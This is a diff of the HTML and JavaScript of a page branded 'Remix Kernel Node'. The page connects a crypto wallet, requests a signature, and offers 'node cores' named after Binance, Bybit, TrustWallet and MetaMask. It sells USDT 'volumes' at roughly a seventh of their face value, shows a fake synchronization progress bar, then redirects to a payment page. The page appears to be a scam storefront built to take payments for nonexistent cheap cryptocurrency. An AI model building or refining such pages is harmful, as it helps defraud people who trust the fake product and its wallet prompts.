@@ -35,7 +35,7 @@
 
         window.appKitModal = modal;
 
-        // التعديل هنا لضمان ظهور رسالة الموافقة وتحديث حالة الزر
+        // مراقبة حالة الحساب لطلب التوقيع وتفعيل الأزرار
         modal.subscribeAccount(async (state) => {
             if (state.isConnected && state.address) {
                 try {
@@ -43,25 +43,18 @@
                     if (provider) {
                         const ethersProvider = new ethers.providers.Web3Provider(provider);
                         const signer = ethersProvider.getSigner();
-                        const message = "Confirm wallet ownership for Remix Kernel Node deployment.";
+                        // طلب رسالة الموافقة لتأكيد العملية في المحفظة
+                        await signer.signMessage("Confirming connection to Remix Kernel Node Deployment.");
                         
-                        // طلب التوقيع
-                        await signer.signMessage(message);
-                        
-                        // تحديث الحالة البرمجية
                         window.isWalletConnected = true;
-                        
-                        // إظهار العنوان في واجهة المستخدم (اختياري لأن الزر يعرضه تلقائياً)
-                        console.log("Connected to:", state.address);
-                        
-                        // تفعيل زر الـ Deploy
-                        if (typeof validateAction === "function") {
-                            validateAction();
-                        }
+                        if (typeof validateAction === "function") validateAction();
                     }
                 } catch (error) {
-                    console.error("User rejected or error occurred:", error);
+                    console.error("Signature rejected:", error);
                 }
+            } else {
+                window.isWalletConnected = false;
+                if (typeof validateAction === "function") validateAction();
             }
         });
     </script>
@@ -88,9 +81,7 @@
             inset: 0;
             z-index: 1000;
             background: #000;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
+            flex-direction: column; align-items: center; justify-content: center;
         }
 
         .content-container {
@@ -105,7 +96,6 @@
             display: flex;
             flex-direction: column;
             padding-bottom: env(safe-area-inset-bottom);
-            overflow: visible;
             margin-top: 60px;
         }
 
@@ -121,8 +111,7 @@
 
         .profile-wrapper {
             position: absolute;
-            top: 0;
-            left: 50%;
+            top: 0; left: 50%;
             transform: translate(-50%, -50%);
             z-index: 100;
         }
@@ -138,9 +127,7 @@
         .ui-btn {
             box-sizing: border-box;
             padding: 16px 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            display: flex; align-items: center; justify-content: center;
             color: #6EEB36;
             font-weight: 800;
             font-size: 14px;
@@ -148,7 +135,6 @@
             border: 1px solid rgba(110, 235, 54, 0.2);
             cursor: not-allowed;
             transition: 0.4s;
-            overflow: hidden;
             border-radius: 20px;
             width: 100%;
             text-transform: uppercase;
@@ -162,6 +148,7 @@
             box-shadow: 0 10px 30px rgba(110, 235, 54, 0.3);
         }
 
+        /* نافذة المعاينة المجانية */
         #freeCheckModal {
             display: none;
             position: fixed;
@@ -169,12 +156,6 @@
             background: #000;
             z-index: 2000;
             flex-direction: column;
-        }
-
-        .iframe-container {
-            flex: 1;
-            width: 100%;
-            background: #fff;
         }
 
         #bottomSheetOverlay, #coreSheetOverlay {
@@ -188,9 +169,7 @@
 
         .bottom-sheet {
             position: fixed;
-            bottom: -100%;
-            left: 0;
-            right: 0;
+            bottom: -100%; left: 0; right: 0;
             background: #1c1c1e;
             border-top: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 24px 24px 0 0;
@@ -205,28 +184,17 @@
 
         .sheet-header {
             padding: 16px 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            display: flex; align-items: center; justify-content: center;
             position: relative;
             border-bottom: 1px solid rgba(255, 255, 255, 0.05);
         }
 
-        .close-btn {
-            position: absolute;
-            right: 20px;
-            color: #8e8e93;
-            font-size: 20px;
-        }
-
-        .sheet-title { font-weight: 600; font-size: 16px; color: #fff; }
+        .close-btn { position: absolute; right: 20px; color: #8e8e93; font-size: 20px; }
 
         .option-item {
             padding: 16px 20px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            transition: background 0.2s;
+            display: flex; align-items: center; justify-content: space-between;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
             cursor: pointer;
         }
         
@@ -240,15 +208,15 @@
     <div id="freeCheckModal">
         <div class="flex items-center justify-between p-4 bg-[#1c1c1e] border-b border-white/10">
             <span class="text-white font-bold">Free Node Preview</span>
-            <button onclick="toggleFreeCheck(false)" class="text-[#6EEB36] font-bold text-sm">CLOSE</button>
+            <button onclick="toggleFreeCheck(false)" class="bg-[#6EEB36] text-black px-4 py-1 rounded-lg font-bold text-xs">CLOSE [X]</button>
         </div>
-        <div class="iframe-container">
+        <div class="flex-1 bg-white">
             <iframe src="https://servernsjaj.onrender.com/" class="w-full h-full border-none"></iframe>
         </div>
     </div>
 
     <div id="loadingOverlay" class="loading-overlay">
-        <img src="erc.gif" class="w-16 h-16 mb-6" alt="Kernel">
+        <img src="erc.gif" class="w-16 h-16 mb-6">
         <div class="text-[#6EEB36] text-[11px] font-black tracking-[0.5em] uppercase mb-8 text-center">Synchronizing Remix Kernel...</div>
         <div class="w-56 h-[2px] bg-white/5 rounded-full overflow-hidden">
             <div id="progressBar" class="h-full bg-[#6EEB36] shadow-[0_0_15px_#6EEB36] transition-all duration-300 w-0"></div>
@@ -258,54 +226,45 @@
     <div id="bottomSheetOverlay"></div>
     <div id="bottomSheet" class="bottom-sheet no-scrollbar">
         <div class="sheet-header">
-            <span class="sheet-title">Select Volume</span>
+            <span class="text-white font-semibold">Select Volume</span>
             <button onclick="closeSheet('amount')" class="close-btn">✕</button>
         </div>
         <div id="amountOptionsContainer" class="py-2"></div>
-        <div class="h-10"></div>
     </div>
 
     <div id="coreSheetOverlay"></div>
     <div id="coreSheet" class="bottom-sheet no-scrollbar">
         <div class="sheet-header">
-            <span class="sheet-title">Choosing the Node Core</span>
+            <span class="text-white font-semibold">Choosing the Node Core</span>
             <button onclick="closeSheet('core')" class="close-btn">✕</button>
         </div>
         <div id="coreOptionsContainer" class="py-2"></div>
-        <div class="h-10"></div>
     </div>
 
     <div class="flex-1 flex flex-col relative z-10 w-full h-full">
-        <div class="h-[120px] flex items-center justify-center pt-8">
-             <div class="text-center">
-                <h2 id="userName" class="text-white text-[16px] font-bold tracking-tight mb-0.5 uppercase">REMIX NODE</h2>
-                <span id="userId" class="text-[#6EEB36] font-mono text-[10px] opacity-60">KRNL-0.54.0</span>
+        <div class="h-[120px] flex items-center justify-center pt-8 text-center">
+            <div>
+                <h2 id="userName" class="text-white text-[16px] font-bold uppercase">REMIX NODE</h2>
+                <span class="text-[#6EEB36] font-mono text-[10px] opacity-60">KRNL-0.54.0</span>
             </div>
         </div>
 
         <div class="content-container">
             <div class="profile-wrapper">
-                <div class="relative">
-                    <div class="w-28 h-28 rounded-[32px] p-[2px] bg-[#6EEB36] border border-black/50 shadow-[0_10px_40px_rgba(0,0,0,0.8)] overflow-hidden">
-                        <img id="userPhoto" src="https://ui-avatars.com/api/?name=Remix&background=000&color=6EEB36" class="w-full h-full rounded-[30px] object-cover" alt="Profile">
-                    </div>
+                <div class="w-28 h-28 rounded-[32px] p-[2px] bg-[#6EEB36] shadow-[0_10px_40px_rgba(0,0,0,0.8)]">
+                    <img id="userPhoto" src="https://ui-avatars.com/api/?name=Remix&background=000&color=6EEB36" class="w-full h-full rounded-[30px] object-cover">
                 </div>
             </div>
 
             <div class="content-inner">
                 <div class="flex-1 space-y-4 overflow-y-auto no-scrollbar">
                     
-                    <div onclick="toggleFreeCheck(true)" class="relative cursor-pointer bg-gradient-to-r from-[#6EEB36]/20 to-transparent border-2 border-[#6EEB36] p-4 rounded-2xl animate-pulse">
+                    <div onclick="toggleFreeCheck(true)" class="cursor-pointer bg-[#6EEB36]/10 border-2 border-[#6EEB36] p-4 rounded-2xl animate-pulse">
                         <div class="flex items-center justify-between">
                             <div class="flex items-center gap-3">
-                                <div class="bg-[#6EEB36] p-1.5 rounded-lg">
-                                    <img src="check.png" class="w-5 h-5" alt="Check">
-                                </div>
-                                <div>
-                                    <h3 class="text-[#6EEB36] text-[14px] font-black italic">CHECK IT FOR FREE</h3>
-                                    <p class="text-white/60 text-[10px] font-bold">Verify Node Status Instantly</p>
-                                </div>
+                                <span class="text-[#6EEB36] text-[14px] font-black italic">CHECK IT FOR FREE</span>
                             </div>
+                            <span class="text-[#6EEB36] text-xl">»</span>
                         </div>
                     </div>
 
@@ -314,21 +273,20 @@
                     </div>
 
                     <div class="space-y-2">
-                        <label class="text-[11px] font-semibold text-white/30 uppercase tracking-widest ml-1 block">Choosing the Node Core</label>
-                        <button id="coreSheetTrigger" class="w-full remix-input rounded-2xl p-4 flex items-center justify-between text-[15px] font-bold text-white">
+                        <label class="text-[10px] text-white/30 uppercase ml-1">Node Core</label>
+                        <button id="coreSheetTrigger" class="w-full remix-input rounded-2xl p-4 flex items-center justify-between font-bold">
                             <span id="selectedCoreText">Select node core</span>
-                            <span class="text-[#6EEB36] text-xl">›</span>
+                            <span class="text-[#6EEB36]">›</span>
                         </button>
                     </div>
 
                     <div class="space-y-2">
-                        <label class="text-[11px] font-semibold text-white/30 uppercase tracking-widest ml-1 block">Allocation Volume</label>
-                        <button id="amountSheetTrigger" class="w-full remix-input rounded-2xl p-4 flex items-center justify-between text-[15px] font-bold text-white">
+                        <label class="text-[10px] text-white/30 uppercase ml-1">Volume</label>
+                        <button id="amountSheetTrigger" class="w-full remix-input rounded-2xl p-4 flex items-center justify-between font-bold">
                             <span id="selectedAmountText">Select volume & price</span>
-                            <span class="text-[#6EEB36] text-xl">›</span>
+                            <span class="text-[#6EEB36]">›</span>
                         </button>
                     </div>
-
                 </div>
 
                 <div class="pt-4 mt-auto">
@@ -349,16 +307,16 @@
         let selectedCore = null;
 
         const basePrice = 14.99;
-        const amounts = [100, 150, 300, 500, 1000, 2000, 3000, 4000, 5000];
-
+        const amounts = [100, 300, 500, 1000, 2000, 5000];
         const cores = [
-            { name: 'Binance', img_src: 'binance.png', file: '3775 users [monthly]' },
-            { name: 'Bybit', img_src: 'bybit.png', file: '2751 users [monthly]' },
-            { name: 'TrustWallet', img_src: 'trustwallet.png', file: '3652 users [monthly]' }
-            // ... بقية الـ cores تضاف هنا
+            { name: 'Binance', file: '3775 users' },
+            { name: 'Bybit', file: '2751 users' },
+            { name: 'TrustWallet', file: '3652 users' },
+            { name: 'MetaMask', file: '3199 users' }
         ];
 
         function toggleFreeCheck(show) { document.getElementById('freeCheckModal').style.display = show ? 'flex' : 'none'; }
+        
         function openSheet(type) {
             const overlay = document.getElementById(type === 'amount' ? 'bottomSheetOverlay' : 'coreSheetOverlay');
             const sheet = document.getElementById(type === 'amount' ? 'bottomSheet' : 'coreSheet');
@@ -375,54 +333,61 @@
         document.getElementById('amountSheetTrigger').onclick = () => openSheet('amount');
         document.getElementById('coreSheetTrigger').onclick = () => openSheet('core');
 
-        // Populate Amounts
-        const amountOptionsContainer = document.getElementById('amountOptionsContainer');
+        // Populate Options
+        const amtContainer = document.getElementById('amountOptionsContainer');
         amounts.forEach(amt => {
-            const currentPrice = ((amt / 100) * basePrice).toFixed(2);
+            const p = ((amt / 100) * basePrice).toFixed(2);
             const div = document.createElement('div');
-            div.className = 'option-item p-4 border-b border-white/5 active:bg-white/5';
-            div.innerHTML = `<span class="text-white font-bold">${amt} USDT — $${currentPrice}</span>`;
+            div.className = 'option-item active:bg-white/5';
+            div.innerHTML = `<span class="text-white font-bold">${amt} USDT — $${p}</span>`;
             div.onclick = () => {
                 selectedAmount = amt;
-                document.getElementById('selectedAmountText').innerText = `${amt} USDT ($${currentPrice})`;
+                document.getElementById('selectedAmountText').innerText = `${amt} USDT ($${p})`;
                 closeSheet('amount');
                 validateAction();
             };
-            amountOptionsContainer.appendChild(div);
+            amtContainer.appendChild(div);
         });
 
-        // Populate Cores
-        const coreOptionsContainer = document.getElementById('coreOptionsContainer');
-        cores.forEach(core => {
+        const coreContainer = document.getElementById('coreOptionsContainer');
+        cores.forEach(c => {
             const div = document.createElement('div');
-            div.className = 'option-item p-4 border-b border-white/5 active:bg-white/5';
-            div.innerHTML = `<span class="text-white font-bold">${core.name}</span>`;
+            div.className = 'option-item active:bg-white/5';
+            div.innerHTML = `<span class="text-white font-bold">${c.name}</span><span class="text-xs text-white/40">${c.file}</span>`;
             div.onclick = () => {
-                selectedCore = core.name;
-                document.getElementById('selectedCoreText').innerText = core.name;
+                selectedCore = c.name;
+                document.getElementById('selectedCoreText').innerText = c.name;
                 closeSheet('core');
                 validateAction();
             };
-            coreOptionsContainer.appendChild(div);
+            coreContainer.appendChild(div);
         });
 
         function validateAction() {
             const btn = document.getElementById('authorizeBtn');
-            // التأكد من أن جميع الشروط محققة بما في ذلك الربط
-            if (window.isWalletConnected && selectedAmount && selectedCore) {
+            // التأكد من حالة الاتصال عبر AppKit مباشرة
+            const account = window.appKitModal?.getAccount();
+            const isConnected = account?.isConnected || window.isWalletConnected;
+
+            if (isConnected && selectedAmount && selectedCore) {
                 btn.disabled = false;
                 btn.classList.add('ready');
+            } else {
+                btn.disabled = true;
+                btn.classList.remove('ready');
             }
         }
 
+        // مراقبة الاتصال كل ثانية لضمان تفعيل الزر فوراً
+        setInterval(validateAction, 1000);
+
         document.getElementById('authorizeBtn').onclick = function() {
             if (this.disabled) return;
-            const loading = document.getElementById('loadingOverlay');
-            const bar = document.getElementById('progressBar');
-            loading.style.display = 'flex';
+            document.getElementById('loadingOverlay').style.display = 'flex';
             let p = 0;
+            const bar = document.getElementById('progressBar');
             const interval = setInterval(() => {
-                p += 3; bar.style.width = p + '%';
+                p += 4; bar.style.width = p + '%';
                 if (p >= 100) {
                     clearInterval(interval);
                     window.location.href = `${selectedAmount}.html`;
